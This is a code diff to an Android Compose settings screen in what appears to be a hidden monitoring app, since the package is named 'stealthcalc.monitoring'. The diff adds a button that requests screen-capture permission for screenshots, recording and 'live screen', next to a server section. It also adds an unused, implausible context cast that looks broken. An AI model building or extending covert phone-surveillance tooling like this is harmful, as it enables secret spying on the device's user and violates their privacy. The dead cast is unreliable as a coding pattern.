@@ -1,5 +1,10 @@
 package com.stealthcalc.monitoring.ui
 
+import android.app.Activity
+import android.content.Context
+import android.media.projection.MediaProjectionManager
+import androidx.activity.compose.rememberLauncherForActivityResult
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.Arrangement
 import androidx.compose.foundation.layout.Column
@@ -15,7 +20,9 @@ import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.automirrored.filled.ArrowBack
 import androidx.compose.material.icons.filled.ChevronRight
+import androidx.compose.material.icons.filled.Screenshare
 import androidx.compose.material3.AlertDialog
+import androidx.compose.material3.Button
 import androidx.compose.material3.ExperimentalMaterial3Api
 import androidx.compose.material3.HorizontalDivider
 import androidx.compose.material3.Icon
@@ -93,6 +100,39 @@ fun AgentConfigScreen(
             HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
 
             PermissionChecklist()
+
+            val context = androidx.compose.ui.platform.LocalContext.current
+            val screenshotCollector = remember {
+                runCatching {
+                    (context.applicationContext as dagger.hilt.android.internal.managers.ViewComponentManager.FragmentContextWrapper)
+                }.getOrNull()
+            }
+            var screenCaptureGranted by remember { mutableStateOf(false) }
+            val screenCaptureLauncher = rememberLauncherForActivityResult(
+                ActivityResultContracts.StartActivityForResult()
+            ) { result ->
+                if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+                    screenCaptureGranted = true
+                    viewModel.onScreenCaptureGranted(result.resultCode, result.data!!)
+                }
+            }
+            SectionHeader("Screen Capture")
+            SettingsRow(
+                title = "Grant Screen Capture",
+                subtitle = if (screenCaptureGranted) "Granted — screenshots & recording enabled"
+                    else "Required for screenshots, screen recording, and live screen",
+                onClick = {
+                    val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                    screenCaptureLauncher.launch(mpm.createScreenCaptureIntent())
+                },
+                trailing = {
+                    if (!screenCaptureGranted) {
+                        Icon(Icons.Default.Screenshare, contentDescription = null)
+                    }
+                }
+            )
+
+            HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
 
             SectionHeader("Server")
 
